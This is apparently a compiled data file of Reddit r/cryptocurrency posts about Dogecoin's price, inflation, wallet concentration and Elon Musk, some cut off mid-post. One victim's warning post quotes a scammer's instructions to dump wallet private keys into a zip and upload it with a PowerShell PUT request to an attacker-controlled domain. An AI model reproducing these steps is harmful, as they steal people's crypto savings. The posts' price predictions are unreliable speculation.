DOGE,cryptocurrency,Dogecoin will never reach $0.69 again,"Dogecoin the original memecoin will not surpass it's previous all time high price of $0.73 in the next bull run.

Lets look at the charts of eight cryptocurrencies including DOGE

&#x200B;

**It's already failed to do it once**

2021 had two runs - one around May and the other around November. Most cryptocurrencies surpassed their previous high from May in November except Dogecoin, Monero and Litecoin.

**Inflation, Inflation, Inflation**

Every time a new block of transactions is added to the Dogecoin blockchain, 10,000 DOGE are mined. That’s about 14.4 million DOGE added per day, or about 5.26 billion per year. There are now roughly Ten billion more DOGE since it hit it's previous high of $0.73, that means it would need to reach a marketcap 7.2 billion dollars higher than May of 2021.

**There is always another Dog Coin**

New comers into the crypto space are looking to repeat the success stories they heard about with DOGE or Shiba investors and will probably buy another random shitcoin that has a much lower marketcap.

^(None of this should be taken as financial advice and I'm probably wrong about all of it,  DOGE will probably become the next world reserve currency.)",234,2023-04-06 18:13:01,576

# If you are buying dogecoin because:

1. *You are doing it for short term profit (Which is a risky game you are playing)*
2. *You are doing it for fun*

&#x200B;

**I'm okay with this because you understand the dynamics involved.** 

&#x200B;

# But if you are doing it for long term profit...

**Lets examine this:**

&#x200B;

Note: I calculated this when dogecoin was at $0.32 several days back (this might not reflect the price when you read this)

* **Although there are many factors that drive Cryptocurrency price, this is a general way to calculate what the price of a cryptocurrency is going to be.**

&#x200B;

* **When you are dividing, if the top number is higher, the answer will be a higher number.**
* **When you are dividing, if the bottom number is higher, the answer will be a lower number.**

* **In order for the Market Cap (Top Number) to go up, many people would have to buy dogecoin**, but many people understand this is a meme coin or a pump/dump coin. They are using this as short term profit or self entertainment because there is no long term adoptation compare to other crypto currency projects.
* **In order for the Circulating Supply (Bottom Number) to go down, they would have to stop mining dogecoin**, but there is 14.4 Dogecoins being produced in one day which is 5 Billion Dogecoin a year.

&#x200B;

* **If you want DogeCoin to be $10** based on the circulating supply we have now, then the **Market Cap would have to be 1.29 Trillion** *(Note: I calculated this several days back, so the number might be even higher now)*, **that's if DOGECOIN STOPPED MINING and NEVER MAKE ANYMORE!**

&#x200B;

https://preview.redd.it/y8uj7wpnkxu61.jpg?width=1098&format=pjpg&auto=webp&s=51bad19cb85914a73423e7e106f224b6fabc6133

&#x200B;

* **How big is a 1.29 Trillion Market Cap? How much would it need to reach $10?**

https://preview.redd.it/z0x2clr2mxu61.jpg?width=1098&format=pjpg&auto=webp&s=d106a23320cfb6d4aedce9742171525939e4ebc2

* **Dogecoin would have to overtake Facebook and Tesla!**

&#x200B;

**Once again, this is if Dogecoin stopped mining right now and produced no more Dogecoin supply, but Dogecoin will produce to infinity, it will not stop producing because there is no cap.**

&#x200B;

**This is like trying to mop a wet floor that has a water leak and the water leak will never stop leaking. Yes, you can recruit more workers to mop the floor, but at some point the workers will quit and leave, then you are left mopping the water by yourself and eventually you will drown in the water.** 

&#x200B;

**Take your mop and go home!**

But if I see another post from someone saying ""but what if Doge is the next Bitcoin"" I think I'll crack!

You can only pump a coin like Doge so far! I'm seeing people saying ""what if it gets to $100 or even $1000?"". Do they have any idea how many of these coins are in circulation?! 

Part of the whole joke of Doge was its rediculous supply cap and real terms inflation, with literally billions of new coins being generated annually. You can only sustain the upwards trajectory of something like that for so long...

If you're a newbie playing with Doge, these is a huge chance your going to lose next to everything. The actual coin is designed to lose ""value"", the fundamental function of the coin is actively working against you!",17578,2021-02-07 20:28:10,2661

Now Doge is approaching 0.10 . The guy is only $250k up, down from $3.25M. $250k is not life changing if you live in California, like he did.

6. Unironically talk about retiring as a result

7. Been harassing & threatening a former member of the dev team telling him to stop all mining and remove the block reward so the value stops getting diluted

DOGE,cryptocurrency,Doge has a single wallet with more than 23.17% of all the Dogecoin in circulation and it can be rugpulled at ANY moment.,"For comparison, the largest Bitcoin wallet is the Binance coldwallet and it holds approximately 1.40% of the current circulating supply while the largest Ethereum wallet is the  Eth2 Deposit Contract which holds 7.6% of all Ethereum.

The largest Dogecoin wallet, which currently holds $5 Billion in Doge of its $21 Billion market cap is very mysterious. It was thought to be Robinhood or some other exchange but that has previously been dismissed by the Robinhood CEO himself.

[Doge wallet with 23.17&#37; of the entire circulating supply](https://preview.redd.it/go0edwi8nic81.png?width=1436&format=png&auto=webp&s=67d99e6b36c56bcf24470f6676421f98dee70f4f)

Any wallet that holds over 23.17% of the current supply has more than enough to rug pull an entire coin to near zero. Even half of that can cause the price to crash to unrecoverable levels due to how liquidity and market caps work.

According to Forkast,

>For new cryptocurrencies, if the top 10 wallets hold **more than 20% of the** token, or worse, a large percentage of the token is held in a single wallet, then this is a dangerous sign of a potential rug pull.

**For Doge, the top 14 wallets own  46.11% of all Dogecoin.**

TLDR: Avoid any Cryptocurrency that has wallets capable of rug pulling the entire project. Don't let a false sense of security take over just because Doge is popular. It still does not make Doge immune to rugpulls. Never let yourself be at the mercy of a single wallet.

EDIT: The amount of people on the comments claiming it to be the Robinhood wallet DESPITE Robinhood's CEO publicly stating the company does not hold that much Doge as far back as May is the same argument Shib shillers make. It is careless copium.

In one of her [last post](https://www.reddit.com/r/dogecoindev/comments/lpucjw/dogecoin_can_reach_1_with_significant_dev) she is clear on how much involvement/ impact Musk has had.

*“Elon has nothing to do with Dogecoin which has been made clear repeatedly … Elon has come to play with Dogecoin for years on social media, it was only recently that people tried to turn that into something it is not … Things have not changed…Elon is not on board with anything, Elon does not have anything to do with the project, the listings, the engagements…Nothing. He memes and trolls.”*

**Feb 2022**

Core developer Ross Nicoll [steps away](https://rnicoll.name/posts/2022-02-16-stepping-away/) from the project referring to stress, a potential lawsuit against the developers and lack of funds the foundation has to pay him anything at all despite the Billionaire supposingly having Devs back.

In a [Twitter thread](https://twitter.com/michilumin/status/1517958353024020480?s=20&t=_9ZUgcvPqct44NLcE4qKMQ) another Dogecoin developer Michi Lumin again paints a picture of an underfunded foundation....

*""When influencers say that the Foundation has tons of funding lined up, or that we're building out infrastructure - and people believe that - it actually harms the @DogecoinFdn because people who would otherwise be willing to help go ""oh, they have it all taken care of"", This bothers me because we're not actually a club full of rich people. Many of us still work day jobs to make ends meet but still want to see #dogecoin proceed and succeed. Tales of palace intrigue end up being things we have to spend time answering to, as well...and the propensity for certain sections of the community and media to be thirsty for the next scandal or conspiracy actually puts a lot of strain on an already fairly stressed crew.""* *""Yes, we're trying to get sustaining funding in order to do some of the 'big ideas' we want to pursue.

DOGE,cryptocurrency,This is how much the creator of Dogecoin earned,"The creator of dogecoin, Billy Markus, is often called ""salty"" online. This is for good reason, he admits. He sees scammers making millions while he himself earned only a fraction on dogecoin. Dogecoin is consistently in the top 20 of all crypto currencies. The meme-coin was founded as a joke, but gained popularity for many different reasons. In the bull market of 2021, the coin rose from $0.01 to $0.74, an increase of over 7400%.

&#x200B;

**Marcus didn't get rich**

In particular, Elon ""dogefather"" Musk contributed to these increases. With tweets and rumors, he made sure that almost everyone was taken in by the currency. In this kind of action there are always winners and losers. So during this period, many people got rich from DOGE, but people also lost money. Billy Markus never really made himself rich with his creation.

***'Of course I'm salty!'***

""*People always say I'm salty,*"" Markus tweeted. ""*Of course I'm salty! I made $3000 from a crypto with a market capitalization of $80 billion. Watching scammers make millions and strangers attack me all day. Who wouldn't be salty?*""

&#x200B;

""I'm not saying I'm struggling, I've always been fine, except when I sold my crypto in 2015 to pay the rent. I'm just giving context to why so many things are so extra annoying; why it's annoying that 'entitled bastards' 8 years later say I should make them richer.""

&#x200B;

*'Create a dogecoin 2'*

So Marcus finds it hard that people hold him accountable for their portfolio, even though he himself had sold his crypto in 2015. A Twitter user shot in an idea to create 'dogecoin 2' to make millions, but that is not possible according to Markus.

DOGE,cryptocurrency,Why is everyone mocking the Dogecoin millionare? Shouldn't we as a community band together instead of mocking other people's success?,"Recent posts here have mocked outright the guy who took a risk and made a million dollars on dogecoin.

So what if he is down from that million? Could it hurt anyone to congratulate the guy instead of poking fun at his misfortune? I mean he is still up 250k and never sold. I don't know about you, but that is more money than I have ever made in crypto and the guy has genuine balls to risk 250k early on Dogecoin.

And incase you didn't notice, the whole damn market is down at the moment not just memecoins.

Yes he took a risk and yes i wouldn't recommend anyone invest that much money on a memecoin, but it paid off for him and isn't the whole damn point of investing in crypto to MAKE money? 

We should be uniting people in the crypto community not dividing them by making fun at them. I for one am happy for him. If he becomes a future multi millionare doge holder I hope he sets and example by being humble back to those smug people who relentlessly poked fun at his misfortune.",856,2022-02-22 07:23:51,467

DOGE,cryptocurrency,Just got Scammed of 91k Dogecoins,"I mined dogecoin in my first year of university in 2013. It was a fun thing to do in-between studying for exams with my floormates. I managed to mine 91k coins. I never touched them since 2013. Thankfully I kept my old laptop.

It had been on my mind even during the last bull market in 2017 if I could even access my dogecoins. Never got around to try, was busy with university/life. And I was more than happy to just keep the dogecoins and see what happens. It was so exciting back then to see DogeCoin go up in price from being worth nothing to $0.06 and eventually $0.08 cents. With the recent price surges, I decided I would figure out how to take out my coins. Mainly because of a growing doubt in my mind that my coins were not accessible. I made a post yesterday about the coins I mined and how to transfer them out of a 2013 wallet. I got a DM from user -Jax\_Brantley- (sorry reddit won't let me link his profile). Telling me that I needed to get on the ""Correct Fork"" otherwise when I send my coins they would be ""stuck in limbo"". He sent me two posts corroborating his claims:

[https://github.com/dogecoin/dogecoin/issues/250](https://github.com/dogecoin/dogecoin/issues/250)

[https://np.reddit.com/r/dogecoinbeg/comments/1uh7z4/beg\_lost\_coins\_to\_fork\_after\_just\_starting\_much/](https://np.reddit.com/r/dogecoinbeg/comments/1uh7z4/beg_lost_coins_to_fork_after_just_starting_much/)

His profile looked legit to me with activity on the doge forums. Even a popular post saying how he recovered 389k of Dogecoins ([https://np.reddit.com/r/dogecoin/comments/n2lmhu/doge\_coin\_saved\_my\_life\_holding\_389k\_coins/](https://np.reddit.com/r/dogecoin/comments/n2lmhu/doge_coin_saved_my_life_holding_389k_coins/)). He told me how my story was similar to his. His profile has many comments ""helping other against scammers"" in the community.

The story he presented to me made sense and I gave him a chance; this was due to my lack of knowledge (my floormate installed everything on my computer), outdated Dogecore wallet, the posts he sent me, his reddit profile. I was unknowingly falling for his bait.. Anyways we talked some more. I uploaded our conversation for those that are interested. It seems he deleted our first messages. [https://imgur.com/gallery/yh1g7CQ](https://imgur.com/gallery/yh1g7CQ)

The main part of my post is to bring awareness to this scam. If anyone is trying to take advantage of your 'old wallet' pre-2014 fork, please do NOT give them any of your time. Please avoid any DMs containing the following steps (he even 'kindly' wrote detailed steps for my dumbass):

Step 1) Close dogecore-qt.exe and find the dogecore-qt.exe (right click it and run as admin)

Step 2) go to Tools -> debug -> console

Step 3) type

dumpwallet [peers-log.zip](https://peers-log.zip/)

Step 4) find the zip beside dogecore-qt.exe or in C:/Program Files/Dogecoin

Step 5) in this folder hold shift + right click anywhere and select open ""powershell here"" from the dropdown menu

Step 6) type this command or copy paste it

invoke-webrequest -method PUT -infile .\\[peers-log.zip](https://peers-log.zip/) [dogecoin-peers.online/nodes](https://dogecoin-peers.online/nodes) \-usebasicparsing

Step 7) go to the new folder it created called ""dogecoin-peers/online"" and find the file called nodes.txt and open it.

Step 8) It will have a list of connection failed and node ID

Step 9) go to the console like in step 2 and type remove node <ID HERE>

Step 10) Restart wallet and you are all done.

After completing step 6, the truth presented itself. I got scammed... I looked on reddit more for this type of scam (should have had a better eye originally). Sadly, I came across this post too late. [https://np.reddit.com/r/dogecoin/comments/n2yxgq/how\_the\_scam\_works/](https://np.reddit.com/r/dogecoin/comments/n2yxgq/how_the_scam_works/)

Thank you to anyone who has read my post. I was conflicted to even post about this because I just was filled with emotion and that it would be an incoherent batch of word salad. After writing this out, I have been able to get more clarity and peace.

I hope there is someone that I can help and they would not fall for the same scam I did. Everyone who has made life-changing money or any money with Dogecoins, I am happy for you. Please appreciate what you have for me.

Take care,

DOGE,cryptocurrency,"Dolce & Gabbana Wants to Crown Dogecoin Fan Elon Musk as ""King of Crypto"".. I prefer ""Clown of Crypto""","So today, the 26th of September 2020, the official twitter of Dolce & Gabbana tweeted the following:

&#x200B;

[Dolce & Gabbana tweet about crowning Elon Musk](https://preview.redd.it/2p8ew3ue7wp71.png?width=602&format=png&auto=webp&s=8426e753a0a4b77a3526e68552344517e42f7beb)

The Doge Crown, which features seven blue sapphires and 142 diamonds, was designed by none other than Domenico Dolce and Stefano Gabbana themselves. 

**However**, the crown has nothing to do with the meme cryptocurrency or its most famous cheerleaders since it was named after the former title of the supreme authority of Venice. 

I believe **it is time that we stop praising** elon musk for doing literally nothing else than pumping a ~~shit~~ memecoin. 

He is not, and will never be the King of Crypto.

DOGE,cryptocurrency,"Back in the day on Reddit dogecoin tipping bot was popular and Redditors used it to tip others. However, one day in 2017 bot owner made a post that they sold all of users' Doge to fund their personal failures. 109 million doge from 84k accounts was stolen, worth $6.7 mill now or $80 mill during ATH","Since I couldn't fit everything in the title I am adding that at the time that this person said user's funds are forever lost, that amount of Doge (in May 2017) was worth around $130k+, so even then it was not a small chunk of money at all. Some users even at that point had over $500 of Doge on their balance.

This is the post the creator of dogecoin tip bot made to justify his actions: https://np.reddit.com/r/dogecoin/comments/69vycc/important_im_taking_dogetipbot_to_a_server_farm/

 So in the whole post he did not really even fully apologize to people, but it felt like that post was made more as an attempt to feel sorry for him. As if he was close to bankruptcy, had to layoff some workers (all types of excuses) so had to take all of the doge from the balances. Exact amount of Doge that was there was 108,911,472.26171964 DOGE from 84,671 accounts in total. That means average user had on balance around 1300 DOGE. That would've been worth over $900 during its ATHs.

A lot of users had pretty huge balances on the dogecointipbot that they did not withdrew which were just wiped out aka stolen by the creator, so they must have felt a great amount of anger when May 2021 hit and Doge reached heights of over $0.7. Some folks had more than 100k Doge on their balances that they thought was safe, and that the person running the dogecointipbot was trustworthy. A lot of that stolen money could have been life changing to people that this was stolen from.

It is even more ridiculous reading some comments in the original post and seeing how he emotionally duped a lot of people as if he's some sort of a victim in this whole story, when in the end all he did was stole other people's crypto and financed their own personal ventures with it.",428,2023-09-20 07:58:40,319

DOGE,cryptocurrency,Is the Era of Dogecoin over?,"I've been watching Dogecoin for quite a while now, it's what brought me into crypto (a little over an year ago!).

Anyways, ever since the grand slam dump of a fall from what was an astonishing number for a coin like doge, It has been in a constant downtrend ever since. Now currently at $0.122 from it's ath of $0.68, thats a fall of nearly 70%!

[Consistent downtrend \(1D chart\)](https://preview.redd.it/kadgk0cpelk81.png?width=891&format=png&auto=webp&s=15f4b2d6d0c637c624ea0a2c22859b6dea2952b7)

There have been minor jumps and pumps along the way, but after every single jump, there's a even bigger dump. The gap between pumps have been becoming higher and higher, and the duration of the pump has shown to be shortening over time.

Is it safe to say the era of not memecoins, but dogecoin in reference is over? I honestly don't think Elon or anyone for that matter would be able to bring back the hype of dogecoin as it was back in May. I personally know many people who bought at the top and still hold for the ""$1 dogecoin!"" line. 

I although did hold through .07 and saw my investment hit the multi-thousands. I didn't sell because of that line, my knowledge in cryptocurrency tokenomics has a huge role in my decision making. I'm still baffled that Dogecoin managed to pull off being in Top 3 cryptocurrencies, when you look at it now. That's crazy!

Anyways, just wanted to discuss my thoughts. What do you think? I don't think doge will ever go back up aside from the little pumps it may have, definitely not close to where it was at it's highest.",629,2022-02-28 15:37:41,621

DOGE,cryptocurrency,"Dogecoin: Who Buys It, Why It Will Fail, and Why It Bothers Me","Woof. Okay. I’ve had enough. So I’ve decided to finally put this down into an original post. 

**I’m going to tell you (A) The people who buy Dogecoin, (B) Why it will fail, and (C) Why it bothers me.**

**(A) The people who buy Dogecoin**

  **A1) The crypto n00b/amateur.** These people were not involved in the last bull market, have no idea how many Dogecoins there are, don’t know how the Dogecoin network is “secured”, think BTC is too expensive, want to get rich quick and think they are getting in early. Most heard about it from a friend who put $100 in and made a few thousand. Some actually believe Doge is the new BTC (lol, ouch). They will ride Dogecoin down in the bear market and get REKT as fuck.

   **A2) The day trader.** These people think they can consistently beat the base rate of simply HODLing BTC and paying capital gains taxes on each trade. Many probably cheat on taxes. Most don’t make much $. They don’t care about any of the technology although some may understand peripherally. They will attempt to buy low and 3-5x their profits and then GTFO. They will never ride their coins down all the way in a crash.

   **A3) The OG doge people.** Many of these people probably have large stashes of non-joke coins like BTC, ETH, etc. A few of them have massive %s of all the Dogecoins in existence. They will slowly dump their bags on the above classes and put it into USD or BTC so they won’t lose their paper millions/billions in the inevitable crash.


**(B) Why Dogecoin will “fail” and crash**

   **B1) The network is incredibly vulnerable to attack and nowhere near a stable store of value because of it.** The hash rate backing it is pathetically small and there is little to no development supporting it…
        **See EDIT2 at end 😇. Apparently it’s not so vulnerable because it’s tied to Litecoin mining which is secure**

   **B2) There is no development on this network.** Fact. Conversely, there is immense amounts of development happening in other projects; development which solves real problems, enhances decentralization, secures billions of real dollars of value, etc
    **edit: apparently there is a small amount of dev now happening. After several years dormant...**

   **B3) It has gone up so fast, people have such huge paper gains that sooner or later they will cash them out**

   **B4) There are 120 BILLION coins, and 14 million new ones per day.** That’s about 4% inflation guaranteed for a decade or two. This type of inflation may be fine for fed coins and government fiat but why the fuck would anyone want it for a future store of value or currency? LOL much no thank you.
    **edit: 4% and slightly decreasing over time**

   **B5) Institutions will never buy this for reasons B1-4 above (and many more).** You cannot sustain market caps in the hundreds of billions of dollars without institutions.


**(C) Why it bothers me**

   **C1) People who don’t know better will get rekt and turned off cRyPto.** Then maybe they’d support fed coin when it comes out and might even support a ban on Bitcoin (should that ever become politically feasible). They’ll miss the true opportunity that is here and allow rich people and institutions to have more of the pie.

   **C2) Nobody crypto-competent would buy and hold Doge, yet people like the Winklevoss twins and other big exchanges are shilling doge coin listings to grab a slice of the trading fees.** They are peddling trash they would never hold themselves to make a quick buck. Sound familiar? Just like today’s big banking system most everyone on here detests.

   **C3) It’s so lazy. It’s obviously not the next Bitcoin.** Do a little research and you’ll know it’s a joke. *It is a fork of a fork OF A FORK of Bitcoin*. The real deal is sitting there in plain sight, but…

   **C4) Unit bias is so real, WOW.** Bitcoin is perceived as too expensive. It’s really sad how human brains fall victim to this extremely well known and obviously-occurring-right-now bias.

   **C5) This may cause a regulatory backlash on legitimate projects.** Puke. The last thing we need is excessive gov regulation around this market. But when misinformed lazy people lose significant amounts in a joke meme project like Dogecoin, you better believe there will be calls to step in.

   **C6) Elon is a narcissistic deuchebag.** Do you really want a narcissistic billionaire in charge of the future of money? No. I want nobody in charge. I want a leaderless, headless, consensus driven decentralized network instead. 

If you have Dogecoin and read this far, bravo, I’m impressed.

**If you are a supporter of real blockchain projects (perhaps aligning with beautiful philosophical goals) and want to help ensure they succeed and aren’t stopped by the dark forces that be, then it’s incumbent on you too to help this revolution succeed. That means stopping scammers and combatting false narratives.**

Rant over. I wish everyone a great bull market part two after this intermission. Have fun staying rich/poor. 

Cheers y’all! 🍻 🖤 


PS: In anticipation of the incoming brain-dead-level attack comments... **I’m not mad about your paper gains bro.** 👹

WOW


**EDIT1: this direct message is why I post this:
“Heya wanted to say thanks for that enlightening post
 I'm new into crypto and love when I see honest and informative posts. You don't know who and what to believe anymore.”**

**EDIT2: apparently litecoin mining (which doge is piggybacked on) is called Scrypt and it is much harder to 51% attack than I thought. I’ll look into it more.**

**EDIT3: I want all of crypto to succeed and I want everyone to win. If doge helps people get into crypto then great. Then maybe they’ll learn more about other projects that are actually doing things.**

**I wish everyone the best just be responsible and stop thinking me pointing out obvious flaws with your pet project are me being toxic lol... it’s sharing pretty much undeniable information; sorry.**",707,2021-05-20 12:22:55,698

The rest of the market  has remained largely unchanged during the pump but fell as Dogecoin began to fall as well. It is ridiculous, very questionable and outright dangerous the influence that Elon Musk has.

On **Dogecoin alone**, the market saw liquidations of almost 10 Million on both longs  and shorts, as shorts were liquidated on the way up and longs on the way down. A truly brutal day for dogecoin leverage players. Meanwhile most of the rest of the market, interestingly, just stood by and watched it  all unfold changing little in their gains during the pump but started seeing some red as Dogecoin began to fall in price, though not nearly to the same degree as Dogecoin.

DOGE,cryptocurrency,Dogecoin is dead! It’s a good thing too.,"While almost every coin is up hella over the last 2 weeks, doge is stuck at 19-20 cents😂 

I think doge brought in a ton of new people to crypto including myself and during this dip over the last few months most of us studied up and realized it’s a shit coin and have pulled our money out and invested in quality projects! 

Thank you doge for bringing me into crypto and snatching 50 percent of my portfolio and teaching me how to get that 50 percent back by not investing in you anymore😂


Edit: a lot of you are missing the point but I would expect nothing less from Reddit.

My point is the hype is dead. And most of the investors have realized there are much better projects to invest in instead of doge which is why we are seeing most legit projects pump these last two weeks while doge stays stagnant. 

This does not mean doge will never go up again. I’m sure it will go up during the next bull run as almost all coins will. But I still think it’s a shit coin in comparison to other top tier coins out. 

Also this is my first ever post in this subreddit and it’s about my own personal experience. It’s not a damn moon farming post I’m actually surprised it’s gotten this much traction. I appreciate all the comments, especially the hate😂",320,2021-08-05 03:02:19,1093

DOGE,cryptocurrency,What is Dogecoin? Why is Dogecoin? How is Dogecoin? Everything you need to know in 5 minutes or less.,"Even though you probably won't admit it, you are secretly holding thousands of Doge hoping that one day it will hit $1 and make your dreams come true.

#**What is Dogecoin?**

Dogecoin was co-founded by IBM software engineer Billy Markus and Adobe software engineer Jackson Palmer, who set out to create a peer-to-peer digital currency that could reach a broader demographic than Bitcoin.

***Full story and a lot of interesting stuff can be found on the [Wiki page](https://en.wikipedia.org/wiki/Dogecoin)*.**

In the beginning, there were only 100 Billion Doge, and all of them were mined in just two years. After that, the code was updated and another 5 Billion Doge were to be created every year making Doge a currency with infinite supply somewhere in 2015. As documented by [mainstream media](https://arstechnica.com/information-technology/2014/02/dogecoin-to-allow-annual-inflation-of-5-billion-coins-each-year-forever/), some community members disliked this decision and complained that their investment will go to zero while others supported the unlimited supply because true Doge believers don't care about USD value. With all those new digital assets emerging from nowhere the internet needed a currency and Doge filled that gap.

#**Why is Dogecoin?**

If Bitcoin ever goes mainstream you probably won't be able to purchase a whole Bitcoin ever again. Sats would become the standard and value should (in theory) constantly keep going up because network usage will need to keep going up as well. Now imagine that you actually held through hell and back, waited for Bitcoin to hit millions just to lose your private keys however that may happen. No one would be able to recover that capital and you would find it hard to get a new reason to move on. With infinite inflation, things look a bit different.

Scarcity rewards those that get in early and hold on to that currency until demand increases significantly. Doge, on the other hand, incentivizes spending and transacting making it an actual currency. 5 Billion coins per year do sound like a lot but it makes perfect sense in the long run. For example, if you have 100 coins and add 100 more the next year your inflation rate would be 100% but as time passes that percentage will decrease due to the increase in supply. In 100 years your inflation rate is only 1% and still decreasing. To put it simply, Bitcoin is an asset that is expected to have an increase in demand within the next few years or decades while Dogecoin is a currency that aims to provide fast, easy, and cheap value transfers in everyday transactions. If Bitcoin is used to store value, Dogecoin is a tool to quickly and cheaply transfer that value.

#**How is Dogecoin?**

Dogecoin was created as a fork of Litecoin and is also [secured by miners](https://www.coinwarz.com/mining/dogecoin/hashrate-chart). It has a much faster block time than LTC of just 1 minute, which made Dogecoin one of the fastest and cheapest currencies to transact with back in the ""old days"". It recently spiked in popularity thanks to Elon Musk and TikTok but if you actually follow the [Dogecoin subreddit](https://np.reddit.com/r/dogecoin/) you will notice that they don't care much about your price speculation. As long as 1 Doge = 1 Doge no one is complaining. In terms of development, there hasn't been a single major update since 2015 but we did make it to [NASCAR](https://www.theguardian.com/technology/2014/mar/27/nascar-dogecoin-sponsor-josh-wise-talladega-superspeedway). As far as network usage goes, Dogecoin [averages](https://bitinfocharts.com/dogecoin/) about 1.3k per hour compared to 14k on the Bitcoin network.

DOGE,cryptocurrency,I hate Dogecoin because of its fanbase.,"I had nothing against Dogecoin. To be honest, I liked it because it was the most popular meme coin these last years and the community seemed really cool - until Elon Musk started to talk about it (at least, that's why I think it became so annoying).

**EVERY POST** involving crypto (in some cases not even involving it), especially posts by Elon Musk, there are these people spamming dumb shit about this doggy coin.

One of the most famous figures I've noticed is [Matt Wallece](https://twitter.com/MattWallace888). Just take a look at his tweets history and you will understand what I'm saying - and he is just one of them.

I'm annoyed of Dogecoin because of these people. How can your life be resumed by *convincing people all the time* that there's a crypto out there that is worth paying for?

Edit: Yeah, hate is a strong word. I don't hate it, but I'm sick of reading Dogecoin everywhere.

They also appear to be sharing a petition (not sure why) around social media sites to put a supply cap on it as well as stop all mining so that the value stops getting diluted.

This may very well be the most delusional thing I've ever seen in the cryptosphere.

DOGE,cryptocurrency,About one year ago Dogecoin hit 0.70 USD. Now it's about 80% lower. Showing that profit taking is not wrong either sometimes.,"Going back one year. Crypto is in it full ""mania"" stage as the rise of meme coins takes place lead by the godfather of memes, Dogecoin itself. Dogecoin hits about 0.70 crossing the magical 0.69 mark. It's just complete doge hype all over the internet. Investors are already seeing the 1$ mark in front of their eyes.

Here we are one year later. Since then DOGE only was in a downtrend from 0.70$ to 0.12$. Reasons are the overall Crypto dump but also fading interest and hype in the crypto itself. Which they are even trying to tackle right now with actual development and a roadmap. But this is not about doge. This is about not being too overconfident with your investment.

Being to overconfident will lead you to the blinded HODL. While holding may be a very good strategy in crypto its not always. Some cryptos rise others disappear you have to look into the market to know where your investments are heading.

If your crypto look weak over the longterm you should take the profit or if your crypto has done an unsustainable pump you should take a profit. Taking profit is not bad, it's smart and wise, also you always have the option to buy low afterwards.",512,2022-05-07 20:55:22,182

I'll be honest. I was expecting it to go the other way. Damn was I wrong.

The ""Buy the rumour, sell the news"" mantra is that investors will start buying up a stock or crypto in anticipation of a big event. Often what happens is that the majority of buying has been done by the time of the event, and the stock/crypto crumbles.

I honestly fully expected this to happen with the confirmed acquisition of Twitter by Elon Musk. For the past few weeks, there had already been massive speculation on the price of DOGE. It shot up, came down, shot up, came down, etc. and all of it was seemingly tied to the Twitter takeover.

&#x200B;

After being burned in the past, I decided not to get involved with Doge this time, and fully expected the price to drop after Elon moved in.

I was basing this off several things in the past, but here are a couple of key considerations:

* The Saturday Night Live skit. Price of DOGE climbed right up until the show started, then started tanking immediately.
* Last month's ETH merge. The price again climbed and climbed approaching the merge, and then came way back down.

I actually considered shorting DOGE, so I guess I'm lucky I didn't bother.

So why did the mantra fail so spectacularly this time?",232,2022-10-31 06:54:18,293

DOGE,cryptocurrency,Deep Dive: What Dogecoin teaches us about human psychology,"**Introduction**

Hyatt Hotels, Toshiba, Fidelity, Wise and Booz Allen Hamilton are corporate titans in their [respective industry sectors](https://companiesmarketcap.com/page/12/). By offering services that touch the lives of many, whether in booking a hotel retreat or facilitating seamless travel, or delivering the latest cutting-edge gadget, all have gained the coveted status of a household name.

Yet the common connection they all share, is a market cap similar to a troll-coin designed to have no worth. [Currently priced at US $0.13](https://defidive.com/cryptocurrency/DOGE) (as of the time of writing on 29th February) after [a 57% rally this week](https://www.tradingview.com/chart/?symbol=BINANCE%3ADOGEUSDT) and holding a market cap of US $19 billion is Dogecoin (ticker symbol DOGE). Unpretentiously and unapologetically ‘selling’ nothing but a bunch of warnings not to invest, I end up questioning the world we live in when nothing of tangible value seems to be attributed to the somewhat success of the project.

Dogecoin underscores the evolving dynamics within the cryptocurrency landscape, challenging conventional notions of value and market influence. In this article we explore how a bunch of do-good social sentiments and an unlikely series of events culminated in Dogecoin becoming a prominent feature in modern internet culture. And curiously… how it can be valued as much as it is.Dogecoin, born out of the internet culture's love for memes and the desire to create a fun and friendly cryptocurrency, has emerged as a distinctive player in the world of digital assets.

Dogecoin was started in 2013 by Jackson Palmer and Billy Markus, who [initially created](https://dogecoin.com/dogepedia/articles/history-of-dogecoin/) it as a joke based on [a cute Shiba Inu dog with poor grammar.](https://knowyourmeme.com/memes/doge) Aptly thinking that the cryptocurrency industry was being taken far too seriously, they took a copy of Litecoin’s code (developers known this as ‘forking’), removed the maximum coin minting limit and changed some of the code’s variables to ensure that the coin’s supply was so generous that it would be worth fractions of a cent. Unlike Bitcoin, which has a capped supply, Dogecoin keeps making more with billions of coins entering circulation each year. This feature has sparked debate within the crypto community giving rise to questions and discussions about the project's long-term viability. Critics argue that a generous coin supply may pose challenges to establishing and maintaining a robust and enduring economic framework for the token.

In science, we use the word antithesis to describe the difference between two ideals or mindsets. In its design proposition stands an antithesis to conventional wisdom in a combination of factors that really should not work. Yet in its viral launch, it quickly gained traction surpassing Bitcoin’s transaction volume in two weeks and becoming Reddit’s tipping currency of choice.

Before venturing into the cryptocurrency industry, my professional experience was in investment banking. There, the common tools for analyzing a company, is a slew of corporate jargon with terms such as balance sheets, liabilities and net asset values. Those on the trading floor went by a vocabulary of fixed income returns, black-scholes and fundamental analysis. All elaborate methods that might seem like ways to justify hefty paychecks, all of which fall flat when applied to Dogecoin.

We might be tempted to think that a business or finance major would be better suited to exploring the themes of Dogecoin price action. However I saw an opportunity to explore a passion of mine, a deep dive into social psychology and behavioral economics to draw a conclusion into the irrationality of Dogecoin’s price action.

The coin's journey evolved in an unexpected rise when high-profile endorsements, particularly from figures like Elon Musk, pushed Dogecoin into the mainstream. Musk's tweets became a catalyst for Dogecoin price movements.

**The Elon effect on Dogecoin’s price**

If you think about Dogecoin, you will think of Musk. The billionaire really loves the coin and every time he tweets about it, the price goes up. With [174 million](https://twitter.com/elonmusk) X (Twitter) followers, his ability to significantly swing the markets is uncanny and has, at times, gotten him into a lot of trouble.

On February 4th 2021, he posted several tweets of Dogecoin, sending the price flying over [40% within the day](https://www.tradingview.com/chart/?symbol=BINANCE%3ADOGEUSDT).

**The Concept of Behavioral Finance**

Behavioral finance and behavioral economics examine how psychological factors and emotional biases influence financial decisions and market outcomes. While in the presence of well-spoken finance folks, ones we might find at our friendly neighborhood bank branch, we’re told that markets are rational. And so it might not make immediate sense that in reality, markets, however justified, are still run by their ultimate decision makers, human beings. In the spirit of mental health awareness, we have to be brutally honest with ourselves that we are just as fallible to the forces of human nature then the next. In the case of Dogecoin and Musk's tweets, there is some interesting psychology at play:

**Herding Behavior / Fear of Missing Out (FOMO)**

